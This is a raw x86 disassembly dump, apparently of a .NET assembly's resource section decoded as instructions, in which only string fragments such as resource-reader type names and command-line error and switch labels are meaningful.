  402692:	add    BYTE PTR [eax],al
  402694:	or     al,BYTE PTR [eax]
  402696:	add    BYTE PTR [ecx],dl
  402698:	jle    0x4026a8
  40269a:	add    BYTE PTR [eax],al
  40269c:	add    al,0x14
  40269e:	sub    BYTE PTR [ecx+0x0],al
  4026a1:	add    BYTE PTR [edx],cl
  4026a3:	sub    al,0x20
  4026a5:	jb     0x4026ce
  4026a7:	add    BYTE PTR [eax],al
  4026a9:	jo     0x40267b
  4026ab:	add    eax,0x28020000
  4026b0:	cmp    DWORD PTR [eax],eax
  4026b2:	add    BYTE PTR [edx],cl
  4026b4:	outs   dx,DWORD PTR ds:[esi]
  4026b5:	inc    edx
  4026b6:	add    BYTE PTR [eax],al
  4026b8:	or     dh,BYTE PTR [ebx+0x43]
  4026bb:	add    BYTE PTR [eax],al
  4026bd:	or     cl,BYTE PTR [edx]
  4026bf:	push   es
  4026c0:	or     BYTE PTR [esi],0x0
  4026c3:	add    BYTE PTR [esi+edi*2],al
  4026c6:	push   cs
  4026c7:	add    BYTE PTR [eax],al
  4026c9:	add    al,0x2a
  4026cb:	sbb    bh,BYTE PTR [esi+0xf]
  4026ce:	add    BYTE PTR [eax],al
  4026d0:	add    al,0x2a
  4026d2:	push   ds
  4026d3:	add    al,BYTE PTR [eax+0x400000f]
  4026d9:	sub    dl,BYTE PTR [esi+0x28]
  4026dc:	adc    BYTE PTR [eax],al
  4026de:	add    BYTE PTR [esi],al
  4026e0:	jb     0x402663
  4026e2:	add    BYTE PTR [eax],al
  4026e4:	jo     0x402764
  4026e6:	sldt   WORD PTR [eax]
  4026e9:	add    al,0x6f
  4026eb:	inc    esp
  4026ec:	add    BYTE PTR [eax],al
  4026ee:	or     ch,BYTE PTR [edx]
  4026f0:	push   esi
  4026f1:	sub    BYTE PTR [eax],dl
  4026f3:	add    BYTE PTR [eax],al
  4026f5:	push   es
  4026f6:	jb     0x4026ab
  4026f8:	add    BYTE PTR [eax],al
  4026fa:	jo     0x40277a
  4026fc:	sldt   WORD PTR [eax]
  4026ff:	add    al,0x6f
  402701:	inc    esp
  402702:	add    BYTE PTR [eax],al
  402704:	or     ch,BYTE PTR [edx]
  402706:	push   esi
  402707:	sub    BYTE PTR [eax],dl
  402709:	add    BYTE PTR [eax],al
  40270b:	push   es
  40270c:	jb     0x4026ed
  40270e:	add    BYTE PTR [eax],al
  402710:	jo     0x402790
  402712:	sldt   WORD PTR [eax]
  402715:	add    al,0x6f
  402717:	inc    esp
  402718:	add    BYTE PTR [eax],al
  40271a:	or     ch,BYTE PTR [edx]
  40271c:	push   esi
  40271d:	sub    BYTE PTR [eax],dl
  40271f:	add    BYTE PTR [eax],al
  402721:	push   es
  402722:	jb     0x402735
  402724:	add    DWORD PTR [eax],eax
  402726:	jo     0x4027a6
  402728:	sldt   WORD PTR [eax]
  40272b:	add    al,0x6f
  40272d:	inc    esp
  40272e:	add    BYTE PTR [eax],al
  402730:	or     ch,BYTE PTR [edx]
  402732:	push   esi
  402733:	sub    BYTE PTR [eax],dl
  402735:	add    BYTE PTR [eax],al
  402737:	push   es
  402738:	jb     0x402771
  40273a:	add    DWORD PTR [eax],eax
  40273c:	jo     0x4027bc
  40273e:	sldt   WORD PTR [eax]
  402741:	add    al,0x6f
  402743:	inc    esp
  402744:	add    BYTE PTR [eax],al
  402746:	or     ch,BYTE PTR [edx]
  402748:	push   esi
  402749:	sub    BYTE PTR [eax],dl
  40274b:	add    BYTE PTR [eax],al
  40274d:	push   es
  40274e:	jb     0x4027bb
  402750:	add    DWORD PTR [eax],eax
  402752:	jo     0x4027d2
  402754:	sldt   WORD PTR [eax]
  402757:	add    al,0x6f
  402759:	inc    esp
  40275a:	add    BYTE PTR [eax],al
  40275c:	or     ch,BYTE PTR [edx]
  40275e:	push   esi
  40275f:	sub    BYTE PTR [eax],dl
  402761:	add    BYTE PTR [eax],al
  402763:	push   es
  402764:	jb     0x40270b
  402766:	add    DWORD PTR [eax],eax
  402768:	jo     0x4027e8
  40276a:	sldt   WORD PTR [eax]
  40276d:	add    al,0x6f
  40276f:	inc    esp
  402770:	add    BYTE PTR [eax],al
  402772:	or     ch,BYTE PTR [edx]
  402774:	push   esi
  402775:	sub    BYTE PTR [eax],dl
  402777:	add    BYTE PTR [eax],al
  402779:	push   es
  40277a:	jb     0x40275f
  40277c:	add    DWORD PTR [eax],eax
  40277e:	jo     0x4027fe
  402780:	sldt   WORD PTR [eax]
  402783:	add    al,0x6f
  402785:	inc    esp
  402786:	add    BYTE PTR [eax],al
  402788:	or     ch,BYTE PTR [edx]
  40278a:	push   esi
  40278b:	sub    BYTE PTR [eax],dl
  40278d:	add    BYTE PTR [eax],al
  40278f:	push   es
  402790:	jb     0x4027ab
  402792:	add    al,BYTE PTR [eax]
  402794:	jo     0x402814
  402796:	sldt   WORD PTR [eax]
  402799:	add    al,0x6f
  40279b:	inc    esp
  40279c:	add    BYTE PTR [eax],al
  40279e:	or     ch,BYTE PTR [edx]
  4027a0:	push   esi
  4027a1:	sub    BYTE PTR [eax],dl
  4027a3:	add    BYTE PTR [eax],al
  4027a5:	push   es
  4027a6:	jb     0x4027ff
  4027a8:	add    al,BYTE PTR [eax]
  4027aa:	jo     0x40282a
  4027ac:	sldt   WORD PTR [eax]
  4027af:	add    al,0x6f
  4027b1:	inc    esp
  4027b2:	add    BYTE PTR [eax],al
  4027b4:	or     ch,BYTE PTR [edx]
  4027b6:	push   esi
  4027b7:	sub    BYTE PTR [eax],dl
  4027b9:	add    BYTE PTR [eax],al
  4027bb:	push   es
  4027bc:	jb     0x402839
  4027be:	add    al,BYTE PTR [eax]
  4027c0:	jo     0x402840
  4027c2:	sldt   WORD PTR [eax]
  4027c5:	add    al,0x6f
  4027c7:	inc    esp
  4027c8:	add    BYTE PTR [eax],al
  4027ca:	or     ch,BYTE PTR [edx]
  4027cc:	push   esi
  4027cd:	sub    BYTE PTR [eax],dl
  4027cf:	add    BYTE PTR [eax],al
  4027d1:	push   es
  4027d2:	jb     0x402781
  4027d4:	add    al,BYTE PTR [eax]
  4027d6:	jo     0x402856
  4027d8:	sldt   WORD PTR [eax]
  4027db:	add    al,0x6f
  4027dd:	inc    esp
  4027de:	add    BYTE PTR [eax],al
  4027e0:	or     ch,BYTE PTR [edx]
  4027e2:	push   esi
  4027e3:	sub    BYTE PTR [eax],dl
  4027e5:	add    BYTE PTR [eax],al
  4027e7:	push   es
  4027e8:	jb     0x4027bd
  4027ea:	add    al,BYTE PTR [eax]
  4027ec:	jo     0x40286c
  4027ee:	sldt   WORD PTR [eax]
  4027f1:	add    al,0x6f
  4027f3:	inc    esp
  4027f4:	add    BYTE PTR [eax],al
  4027f6:	or     ch,BYTE PTR [edx]
  4027f8:	push   esi
  4027f9:	sub    BYTE PTR [eax],dl
  4027fb:	add    BYTE PTR [eax],al
  4027fd:	push   es
  4027fe:	jb     0x4027fb
  402800:	add    al,BYTE PTR [eax]
  402802:	jo     0x402882
  402804:	sldt   WORD PTR [eax]
  402807:	add    al,0x6f
  402809:	inc    esp
  40280a:	add    BYTE PTR [eax],al
  40280c:	or     ch,BYTE PTR [edx]
  40280e:	push   esi
  40280f:	sub    BYTE PTR [eax],dl
  402811:	add    BYTE PTR [eax],al
  402813:	push   es
  402814:	jb     0x40283b
  402816:	add    eax,DWORD PTR [eax]
  402818:	jo     0x402898
  40281a:	sldt   WORD PTR [eax]
  40281d:	add    al,0x6f
  40281f:	inc    esp
  402820:	add    BYTE PTR [eax],al
  402822:	or     ch,BYTE PTR [edx]
  402824:	push   esi
  402825:	sub    BYTE PTR [eax],dl
  402827:	add    BYTE PTR [eax],al
  402829:	push   es
  40282a:	jb     0x402887
  40282c:	add    eax,DWORD PTR [eax]
  40282e:	jo     0x4028ae
  402830:	sldt   WORD PTR [eax]
  402833:	add    al,0x6f
  402835:	inc    esp
  402836:	add    BYTE PTR [eax],al
  402838:	or     ch,BYTE PTR [edx]
  40283a:	push   esi
  40283b:	sub    BYTE PTR [eax],dl
  40283d:	add    BYTE PTR [eax],al
  40283f:	push   es
  402840:	jb     0x4027c3
  402842:	add    eax,DWORD PTR [eax]
  402844:	jo     0x4028c4
  402846:	sldt   WORD PTR [eax]
  402849:	add    al,0x6f
  40284b:	inc    esp
  40284c:	add    BYTE PTR [eax],al
  40284e:	or     ch,BYTE PTR [edx]
  402850:	push   esi
  402851:	sub    BYTE PTR [eax],dl
  402853:	add    BYTE PTR [eax],al
  402855:	push   es
  402856:	jb     0x402809
  402858:	add    eax,DWORD PTR [eax]
  40285a:	jo     0x4028da
  40285c:	sldt   WORD PTR [eax]
  40285f:	add    al,0x6f
  402861:	inc    esp
  402862:	add    BYTE PTR [eax],al
  402864:	or     ch,BYTE PTR [edx]
  402866:	push   esi
  402867:	sub    BYTE PTR [eax],dl
  402869:	add    BYTE PTR [eax],al
  40286b:	push   es
  40286c:	jb     0x402853
  40286e:	add    eax,DWORD PTR [eax]
  402870:	jo     0x4028f0
  402872:	sldt   WORD PTR [eax]
  402875:	add    al,0x6f
  402877:	inc    esp
  402878:	add    BYTE PTR [eax],al
  40287a:	or     ch,BYTE PTR [edx]
  40287c:	push   esi
  40287d:	sub    BYTE PTR [eax],dl
  40287f:	add    BYTE PTR [eax],al
  402881:	push   es
  402882:	jb     0x402897
  402884:	add    al,0x0
  402886:	jo     0x402906
  402888:	sldt   WORD PTR [eax]
  40288b:	add    al,0x6f
  40288d:	inc    esp
  40288e:	add    BYTE PTR [eax],al
  402890:	or     ch,BYTE PTR [edx]
  402892:	push   esi
  402893:	sub    BYTE PTR [eax],dl
  402895:	add    BYTE PTR [eax],al
  402897:	push   es
  402898:	jb     0x4028dd
  40289a:	add    al,0x0
  40289c:	jo     0x40291c
  40289e:	sldt   WORD PTR [eax]
  4028a1:	add    al,0x6f
  4028a3:	inc    esp
  4028a4:	add    BYTE PTR [eax],al
  4028a6:	or     ch,BYTE PTR [edx]
  4028a8:	fwait
  4028a9:	or     DWORD PTR [eax],eax
  4028ab:	add    dh,cl
  4028ad:	retf   0xbeef
  4028b0:	add    DWORD PTR [eax],eax
  4028b2:	add    BYTE PTR [eax],al
  4028b4:	xchg   ecx,eax
  4028b5:	add    BYTE PTR [eax],al
  4028b7:	add    BYTE PTR [ebx+edx*2+0x79],ch
  4028bb:	jae    0x402931
  4028bd:	gs ins DWORD PTR es:[edi],dx
  4028bf:	cs push edx
  4028c1:	gs jae 0x402933
  4028c4:	jne    0x402938
  4028c6:	arpl   WORD PTR [ebp+0x73],sp
  4028c9:	cs push edx
  4028cb:	gs jae 0x40293d
  4028ce:	jne    0x402942
  4028d0:	arpl   WORD PTR [ebp+0x52],sp
  4028d3:	gs popa 
  4028d5:	fs gs jb 0x402905
  4028d9:	and    BYTE PTR [ebp+0x73],ch
  4028dc:	arpl   WORD PTR [edi+0x72],bp
  4028df:	ins    BYTE PTR es:[edi],dx
  4028e0:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  4028e7:	jae    0x402952
  4028e9:	outs   dx,DWORD PTR ds:[esi]
  4028ea:	outs   dx,BYTE PTR ds:[esi]
  4028eb:	cmp    eax,0x2e302e34
  4028f0:	xor    BYTE PTR [esi],ch
  4028f2:	xor    BYTE PTR [eax+eiz*1],ch
  4028f5:	inc    ebx
  4028f6:	jne    0x402964
  4028f8:	je     0x40296f
  4028fa:	jb     0x402961
  4028fc:	cmp    eax,0x7475656e
  402901:	jb     0x402964
  402903:	ins    BYTE PTR es:[edi],dx
  402904:	sub    al,0x20
  402906:	push   eax
  402907:	jne    0x40296b
  402909:	ins    BYTE PTR es:[edi],dx
  40290a:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  402911:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  402915:	bound  esi,QWORD PTR [edi]
  402917:	aaa    
  402918:	popa   
  402919:	xor    eax,0x31363563
  40291e:	cmp    DWORD PTR [ebx],esi
  402920:	xor    al,0x65
  402922:	xor    BYTE PTR [eax],bh
  402924:	cmp    DWORD PTR [ebx],esp
  402926:	push   ebx
  402927:	jns    0x40299c
  402929:	je     0x402990
  40292b:	ins    DWORD PTR es:[edi],dx
  40292c:	cs push edx
  40292e:	gs jae 0x4029a0
  402931:	jne    0x4029a5
  402933:	arpl   WORD PTR [ebp+0x73],sp
  402936:	cs push edx
  402938:	jne    0x4029a8
  40293a:	je     0x4029a5
  40293c:	ins    DWORD PTR es:[edi],dx
  40293d:	gs push edx
  40293f:	gs jae 0x4029b1
  402942:	jne    0x4029b6
  402944:	arpl   WORD PTR [ebp+0x53],sp
  402947:	gs je  0x40294c
  40294a:	add    BYTE PTR [eax],al
  40294c:	add    BYTE PTR ds:0x0,dl
  402952:	add    BYTE PTR [eax],al
  402954:	add    BYTE PTR [eax+0x41],dl
  402957:	inc    esp
  402958:	push   eax
  402959:	inc    ecx
  40295a:	inc    esp
  40295b:	push   eax
  40295c:	xchg   edi,esi
  40295e:	inc    ecx
  40295f:	or     BYTE PTR [ecx],0xb8
  402962:	jae    0x4028e7
  402964:	jne    0x402972
  402966:	cwde   
  402967:	test   dl,ah
  402969:	pusha  
  40296a:	aas    
  40296b:	mov    DWORD PTR [eax],ebp
  40296d:	dec    ebp
  40296e:	pop    eax
  40296f:	xchg   ebx,eax
  402970:	mov    ch,0x5
  402972:	lea    edi,[eax-0x3f1721ea]
  402978:	jmp    0x9de3:0xacc3af0a
  40297f:	(bad)  
  402980:	mov    al,al
  402982:	pop    ebx
  402983:	int3   
  402984:	clc    
  402985:	mov    eax,ds:0x8696e783
  40298a:	icebp  
  40298b:	in     al,dx
  40298c:	mov    ch,0x35
  40298e:	jecxz  0x402983
  402990:	inc    ebp
  402991:	ins    BYTE PTR es:[edi],dx
  402992:	xchg   esp,eax
  402993:	add    eax,DWORD PTR ds:0x3f1db22d
  402999:	xor    BYTE PTR [edi+0x2e4f1922],0x3f
  4029a0:	inc    esp
  4029a1:	retf   
  4029a2:	pusha  
  4029a3:	aas    
  4029a4:	fcomp  DWORD PTR [edx-0x30]
  4029a7:	inc    edi
  4029a8:	ret    0xd061
  4029ab:	dec    esi
  4029ac:	int    0x7b
  4029ae:	lock dec edi
  4029b0:	call   0x1:0x36000003
  4029b7:	add    BYTE PTR ds:0xc2000000,dh
  4029bd:	add    BYTE PTR [eax],al
  4029bf:	add    cl,dh
  4029c1:	add    DWORD PTR [eax],eax
  4029c3:	add    cl,bh
  4029c5:	add    BYTE PTR [eax],al
  4029c7:	add    BYTE PTR [ebx+0x3],ah
  4029ca:	add    BYTE PTR [eax],al
  4029cc:	ja     0x4029cf
  4029ce:	add    BYTE PTR [eax],al
  4029d0:	inc    BYTE PTR [ebx]
  4029d2:	add    BYTE PTR [eax],al
  4029d4:	cdq    
  4029d5:	add    BYTE PTR [eax],al
  4029d7:	add    BYTE PTR [eax],al
  4029d9:	add    BYTE PTR [eax],al
  4029db:	add    dl,bl
  4029dd:	add    al,BYTE PTR [eax]
  4029df:	add    BYTE PTR [ecx+0x30000002],ah
  4029e5:	add    eax,DWORD PTR [eax]
  4029e7:	add    BYTE PTR [eax+0x76000001],dh
  4029ed:	add    al,BYTE PTR [eax]
  4029ef:	add    bl,cl
  4029f1:	add    eax,DWORD PTR [eax]
  4029f3:	add    BYTE PTR [edi],al
  4029f5:	add    eax,DWORD PTR [eax]
  4029f7:	add    BYTE PTR [ebp+0x2],cl
  4029fa:	add    BYTE PTR [eax],al
  4029fc:	add    BYTE PTR fs:[eax],al
  4029ff:	add    BYTE PTR [eax],bl
  402a01:	add    al,BYTE PTR [eax]
  402a03:	add    BYTE PTR [ebx+0x5],ch
  402a06:	add    BYTE PTR [eax],al
  402a08:	xor    BYTE PTR [ebp+0x0],al
  402a0b:	jb     0x402a0d
  402a0d:	jb     0x402a0f
  402a0f:	outs   dx,DWORD PTR ds:[esi]
  402a10:	add    BYTE PTR [edx+0x0],dh
  402a13:	pop    edi
  402a14:	add    BYTE PTR [ecx+0x0],cl
  402a17:	outs   dx,BYTE PTR ds:[esi]
  402a18:	add    BYTE PTR [esi+0x0],dh
  402a1b:	popa   
  402a1c:	add    BYTE PTR [eax+eax*1+0x69],ch
  402a20:	add    BYTE PTR [eax+eax*1+0x43],ah
  402a24:	add    BYTE PTR [ebp+0x0],dh
  402a27:	ins    BYTE PTR es:[edi],dx
  402a28:	add    BYTE PTR [eax+eax*1+0x75],dh
  402a2c:	add    BYTE PTR [edx+0x0],dh
  402a2f:	add    BYTE PTR gs:[esi+0x0],cl
  402a33:	popa   
  402a34:	add    BYTE PTR [ebp+0x0],ch
  402a37:	add    BYTE PTR gs:[eax],al
  402a3a:	add    BYTE PTR [eax],al
  402a3c:	add    BYTE PTR [edx],ch
  402a3e:	inc    ebp
  402a3f:	add    BYTE PTR [edx+0x0],dh
  402a42:	jb     0x402a44
  402a44:	outs   dx,DWORD PTR ds:[esi]
  402a45:	add    BYTE PTR [edx+0x0],dh
  402a48:	pop    edi
  402a49:	add    BYTE PTR [ebp+0x0],cl
  402a4c:	imul   eax,DWORD PTR [eax],0x730073
  402a52:	imul   eax,DWORD PTR [eax],0x67006e
  402a58:	inc    ecx
  402a59:	add    BYTE PTR [edx+0x0],dh
  402a5c:	add    BYTE PTR [di+0x0],dh
  402a60:	ins    DWORD PTR es:[edi],dx
  402a61:	add    BYTE PTR [ebp+0x0],ah
  402a64:	outs   dx,BYTE PTR ds:[esi]
  402a65:	add    BYTE PTR [eax+eax*1+0x16],dh
  402a69:	add    BYTE PTR [eax],al
  402a6b:	add    BYTE PTR [eax],dh
  402a6d:	inc    ebp
  402a6e:	add    BYTE PTR [edx+0x0],dh
  402a71:	jb     0x402a73
  402a73:	outs   dx,DWORD PTR ds:[esi]
  402a74:	add    BYTE PTR [edx+0x0],dh
  402a77:	pop    edi
  402a78:	add    BYTE PTR [ebp+0x0],cl
  402a7b:	imul   eax,DWORD PTR [eax],0x730073
  402a81:	imul   eax,DWORD PTR [eax],0x67006e
  402a87:	dec    ebx
  402a88:	add    BYTE PTR [ebp+0x0],ah
  402a8b:	jns    0x402a8d
  402a8d:	inc    ecx
  402a8e:	add    BYTE PTR [edx+0x0],dh
  402a91:	add    BYTE PTR [di+0x0],dh
  402a95:	ins    DWORD PTR es:[edi],dx
  402a96:	add    BYTE PTR [ebp+0x0],ah
  402a99:	outs   dx,BYTE PTR ds:[esi]
  402a9a:	add    BYTE PTR [eax+eax*1+0x28],dh
  402a9e:	add    BYTE PTR [eax],al
  402aa0:	add    BYTE PTR [eax*2+0x72007200],ah
  402aa7:	add    BYTE PTR [edi+0x0],ch
  402aaa:	jb     0x402aac
  402aac:	pop    edi
  402aad:	add    BYTE PTR [esi+0x0],cl
  402ab0:	jne    0x402ab2
  402ab2:	ins    BYTE PTR es:[edi],dx
  402ab3:	add    BYTE PTR [eax+eax*1+0x41],ch
  402ab7:	add    BYTE PTR [edx+0x0],dh
  402aba:	add    BYTE PTR [di+0x0],dh
  402abe:	ins    DWORD PTR es:[edi],dx
  402abf:	add    BYTE PTR [ebp+0x0],ah
  402ac2:	outs   dx,BYTE PTR ds:[esi]
  402ac3:	add    BYTE PTR [eax+eax*1+0x4f],dh
  402ac7:	add    BYTE PTR [eax],al
  402ac9:	add    BYTE PTR [edx],dh
  402acb:	inc    ebp
  402acc:	add    BYTE PTR [edx+0x0],dh
  402acf:	jb     0x402ad1
  402ad1:	outs   dx,DWORD PTR ds:[esi]
  402ad2:	add    BYTE PTR [edx+0x0],dh
  402ad5:	pop    edi
  402ad6:	add    BYTE PTR [esi+0x0],cl
  402ad9:	jne    0x402adb
  402adb:	ins    BYTE PTR es:[edi],dx
  402adc:	add    BYTE PTR [eax+eax*1+0x4f],ch
  402ae0:	add    BYTE PTR [edx+0x0],dh
  402ae3:	inc    ebp
  402ae4:	add    BYTE PTR [ebp+0x0],ch
  402ae7:	jo     0x402ae9
  402ae9:	je     0x402aeb
  402aeb:	jns    0x402aed
  402aed:	inc    ecx
  402aee:	add    BYTE PTR [edx+0x0],dh
  402af1:	add    BYTE PTR [di+0x0],dh
  402af5:	ins    DWORD PTR es:[edi],dx
  402af6:	add    BYTE PTR [ebp+0x0],ah
  402af9:	outs   dx,BYTE PTR ds:[esi]
  402afa:	add    BYTE PTR [eax+eax*1+0x5e],dh
  402afe:	add    BYTE PTR [eax],al
  402b00:	add    BYTE PTR [eax],bh
  402b02:	inc    ebp
  402b03:	add    BYTE PTR [edx+0x0],dh
  402b06:	jb     0x402b08
  402b08:	outs   dx,DWORD PTR ds:[esi]
  402b09:	add    BYTE PTR [edx+0x0],dh
  402b0c:	pop    edi
  402b0d:	add    BYTE PTR [esi+0x0],cl
  402b10:	jne    0x402b12
  402b12:	ins    BYTE PTR es:[edi],dx
  402b13:	add    BYTE PTR [eax+eax*1+0x4f],ch
  402b17:	add    BYTE PTR [edx+0x0],dh
  402b1a:	inc    ebp
  402b1b:	add    BYTE PTR [ebp+0x0],ch
  402b1e:	jo     0x402b20
  402b20:	je     0x402b22
  402b22:	jns    0x402b24
  402b24:	dec    ebx
  402b25:	add    BYTE PTR [ebp+0x0],ah
  402b28:	jns    0x402b2a
  402b2a:	inc    ecx
  402b2b:	add    BYTE PTR [edx+0x0],dh
  402b2e:	add    BYTE PTR [di+0x0],dh
  402b32:	ins    DWORD PTR es:[edi],dx
  402b33:	add    BYTE PTR [ebp+0x0],ah
  402b36:	outs   dx,BYTE PTR ds:[esi]
  402b37:	add    BYTE PTR [eax+eax*1+0x76],dh
  402b3b:	add    BYTE PTR [eax],al
  402b3d:	add    BYTE PTR [eax*2+0x72007200],bh
  402b44:	add    BYTE PTR [edi+0x0],ch
  402b47:	jb     0x402b49
  402b49:	pop    edi
  402b4a:	add    BYTE PTR [esi+0x0],cl
  402b4d:	jne    0x402b4f
  402b4f:	ins    BYTE PTR es:[edi],dx
  402b50:	add    BYTE PTR [eax+eax*1+0x4f],ch
  402b54:	add    BYTE PTR [edx+0x0],dh
  402b57:	inc    ebp
  402b58:	add    BYTE PTR [ebp+0x0],ch
  402b5b:	jo     0x402b5d
  402b5d:	je     0x402b5f
  402b5f:	jns    0x402b61
  402b61:	push   esi
  402b62:	add    BYTE PTR [ecx+0x0],ah
  402b65:	ins    BYTE PTR es:[edi],dx
  402b66:	add    BYTE PTR [ebp+0x0],dh
  402b69:	add    BYTE PTR gs:[ecx+0x0],al
  402b6d:	jb     0x402b6f
  402b6f:	add    BYTE PTR [di+0x0],dh
  402b73:	ins    DWORD PTR es:[edi],dx
  402b74:	add    BYTE PTR [ebp+0x0],ah
  402b77:	outs   dx,BYTE PTR ds:[esi]
  402b78:	add    BYTE PTR [eax+eax*1-0x5d],dh
  402b7c:	add    BYTE PTR [eax],al
  402b7e:	add    BYTE PTR [eax*2+0x72007200],dh
  402b85:	add    BYTE PTR [edi+0x0],ch
  402b88:	jb     0x402b8a
  402b8a:	pop    edi
  402b8b:	add    BYTE PTR [ebp+0x0],dl
  402b8e:	outs   dx,BYTE PTR ds:[esi]
  402b8f:	add    BYTE PTR [edx+0x0],dh
  402b92:	add    BYTE PTR gs:[ebx+0x0],ah
  402b96:	outs   dx,DWORD PTR ds:[esi]
  402b97:	add    BYTE PTR [edi+0x0],ah
  402b9a:	outs   dx,BYTE PTR ds:[esi]
  402b9b:	add    BYTE PTR [ecx+0x0],ch
  402b9e:	jp     0x402ba0
  402ba0:	add    BYTE PTR gs:[eax+eax*1+0x41],ah
  402ba5:	add    BYTE PTR [edx+0x0],dh
  402ba8:	add    BYTE PTR [di+0x0],dh
  402bac:	ins    DWORD PTR es:[edi],dx
  402bad:	add    BYTE PTR [ebp+0x0],ah
  402bb0:	outs   dx,BYTE PTR ds:[esi]
  402bb1:	add    BYTE PTR [eax+eax*1-0x2e],dh
  402bb5:	add    BYTE PTR [eax],al
  402bb7:	add    BYTE PTR [eax*2+0x72007200],bh
  402bbe:	add    BYTE PTR [edi+0x0],ch
  402bc1:	jb     0x402bc3
  402bc3:	pop    edi
  402bc4:	add    BYTE PTR [ebp+0x0],dl
  402bc7:	outs   dx,BYTE PTR ds:[esi]
  402bc8:	add    BYTE PTR [edx+0x0],dh
  402bcb:	add    BYTE PTR gs:[ebx+0x0],ah
  402bcf:	outs   dx,DWORD PTR ds:[esi]
  402bd0:	add    BYTE PTR [edi+0x0],ah
  402bd3:	outs   dx,BYTE PTR ds:[esi]
  402bd4:	add    BYTE PTR [ecx+0x0],ch
  402bd7:	jp     0x402bd9
  402bd9:	add    BYTE PTR gs:[eax+eax*1+0x4f],ah
  402bde:	add    BYTE PTR [ebp+0x0],dh
  402be1:	je     0x402be3
  402be3:	jo     0x402be5
  402be5:	jne    0x402be7
  402be7:	je     0x402be9
  402be9:	inc    esi
  402bea:	add    BYTE PTR [edi+0x0],ch
  402bed:	jb     0x402bef
  402bef:	ins    DWORD PTR es:[edi],dx
  402bf0:	add    BYTE PTR [ecx+0x0],ah
  402bf3:	je     0x402bf5
  402bf5:	jmp    0x22402bfa
  402bfa:	push   ebx
  402bfb:	add    BYTE PTR [edi+0x0],dh
  402bfe:	imul   eax,DWORD PTR [eax],0x630074
  402c04:	push   0x41005f00
  402c09:	add    BYTE PTR [eax+eax*1+0x6c],ch
  402c0d:	add    BYTE PTR [edi+0x0],bl
  402c10:	dec    esi
  402c11:	add    BYTE PTR [edi+0x0],cl
  402c14:	dec    esp
  402c15:	add    BYTE PTR [edi+0x0],cl
  402c18:	inc    ebx
  402c19:	add    BYTE PTR [edi+0x0],bl
  402c1c:	inc    BYTE PTR [eax]
  402c1e:	add    BYTE PTR [eax],al
  402c20:	xor    BYTE PTR [ebx+0x0],dl
  402c23:	ja     0x402c25
  402c25:	imul   eax,DWORD PTR [eax],0x630074
  402c2b:	push   0x45005f00
  402c30:	add    BYTE PTR [eax+0x0],bh
  402c33:	arpl   WORD PTR [eax],ax
  402c35:	add    BYTE PTR gs:[eax+0x0],dh
  402c39:	je     0x402c3b
  402c3b:	imul   eax,DWORD PTR [eax],0x6e006f
  402c41:	jae    0x402c43
  402c43:	pop    edi
  402c44:	add    BYTE PTR [esi+0x0],cl
  402c47:	dec    edi
  402c48:	add    BYTE PTR [eax+eax*1+0x4f],cl
  402c4c:	add    BYTE PTR [ebx+0x0],al
  402c4f:	pop    edi
  402c50:	add    BYTE PTR [ecx+eax*1],al
  402c53:	add    BYTE PTR [eax],al
  402c55:	and    al,0x53
  402c57:	add    BYTE PTR [edi+0x0],dh
  402c5a:	imul   eax,DWORD PTR [eax],0x630074
  402c60:	push   0x48005f00
  402c65:	add    BYTE PTR [ebp+0x0],ah
  402c68:	ins    BYTE PTR es:[edi],dx
  402c69:	add    BYTE PTR [eax+0x0],dh
  402c6c:	pop    edi
  402c6d:	add    BYTE PTR [esi+0x0],cl
  402c70:	dec    edi
  402c71:	add    BYTE PTR [eax+eax*1+0x4f],cl
  402c75:	add    BYTE PTR [ebx+0x0],al
  402c78:	pop    edi
  402c79:	add    BYTE PTR [ecx],dl
  402c7b:	add    DWORD PTR [eax],eax
  402c7d:	add    BYTE PTR [esi],ah
  402c7f:	push   ebx
  402c80:	add    BYTE PTR [edi+0x0],dh
  402c83:	imul   eax,DWORD PTR [eax],0x630074
  402c89:	push   0x49005f00
  402c8e:	add    BYTE PTR [esi+0x0],ch
  402c91:	jo     0x402c93
  402c93:	jne    0x402c95
  402c95:	je     0x402c97
  402c97:	pop    edi
  402c98:	add    BYTE PTR [esi+0x0],cl
  402c9b:	dec    edi
  402c9c:	add    BYTE PTR [eax+eax*1+0x4f],cl
  402ca0:	add    BYTE PTR [ebx+0x0],al
  402ca3:	pop    edi
  402ca4:	add    BYTE PTR [eax],bl
  402ca6:	add    DWORD PTR [eax],eax
  402ca8:	add    BYTE PTR [ebx+edx*2],dh
  402cab:	add    BYTE PTR [edi+0x0],dh
  402cae:	imul   eax,DWORD PTR [eax],0x630074
  402cb4:	push   0x4f005f00
  402cb9:	add    BYTE PTR [ebp+0x0],dh
  402cbc:	je     0x402cbe
  402cbe:	jo     0x402cc0
  402cc0:	jne    0x402cc2
  402cc2:	je     0x402cc4
  402cc4:	inc    esi
  402cc5:	add    BYTE PTR [edi+0x0],ch
  402cc8:	jb     0x402cca
  402cca:	ins    DWORD PTR es:[edi],dx
  402ccb:	add    BYTE PTR [ecx+0x0],ah
  402cce:	je     0x402cd0
  402cd0:	pop    edi
  402cd1:	add    BYTE PTR [esi+0x0],cl
  402cd4:	dec    edi
  402cd5:	add    BYTE PTR [eax+eax*1+0x4f],cl
  402cd9:	add    BYTE PTR [ebx+0x0],al
  402cdc:	pop    edi
  402cdd:	add    BYTE PTR [eax],ah
  402cdf:	add    DWORD PTR [eax],eax
  402ce1:	add    BYTE PTR [eax],ch
  402ce3:	push   ebx
  402ce4:	add    BYTE PTR [edi+0x0],dh
  402ce7:	imul   eax,DWORD PTR [eax],0x630074
  402ced:	push   0x4f005f00
  402cf2:	add    BYTE PTR [ebp+0x0],dh
  402cf5:	je     0x402cf7
  402cf7:	jo     0x402cf9
  402cf9:	jne    0x402cfb
  402cfb:	je     0x402cfd
  402cfd:	pop    edi
  402cfe:	add    BYTE PTR [esi+0x0],cl
  402d01:	dec    edi
  402d02:	add    BYTE PTR [eax+eax*1+0x4f],cl
  402d06:	add    BYTE PTR [ebx+0x0],al
  402d09:	pop    edi
  402d0a:	add    BYTE PTR [ecx],ch
  402d0c:	add    DWORD PTR [eax],eax
  402d0e:	add    BYTE PTR [ebx+edx*2],ah
  402d11:	add    BYTE PTR [edi+0x0],dh
  402d14:	imul   eax,DWORD PTR [eax],0x630074
  402d1a:	push   0x50005f00
  402d1f:	add    BYTE PTR [ecx+0x0],ah
  402d22:	je     0x402d24
  402d24:	push   0x4e005f00
